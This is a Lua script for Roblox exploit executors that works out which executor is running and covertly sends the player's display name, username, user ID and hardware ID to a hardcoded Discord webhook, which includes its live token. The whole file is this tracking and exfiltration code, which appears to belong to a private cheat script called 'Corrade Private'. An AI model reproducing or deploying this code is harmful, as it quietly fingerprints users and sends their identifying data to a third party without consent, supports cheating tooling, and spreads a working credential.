local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

   local player = game:GetService("Players").LocalPlayer
   local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

local url =
   "https://discord.com/api/webhooks/1142570602025193592/aK1QNVr_mjRvvN4q0ZuDj9ZwWxEVdKGgmUfEE_ojMfnIAWiZv2HagcolKhapJEYRjz3D"
local data = {
   ["embeds"] = {
       {
           ["title"] = "**Corrade Private has been executed**",
           ["description"] = "Display Name: "..player.DisplayName.." | Username: " .. player.Name.." | User ID: "..player.UserId.." | **Used Exploit: "..webhookcheck.."**".." | **HWID: "..hwid.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
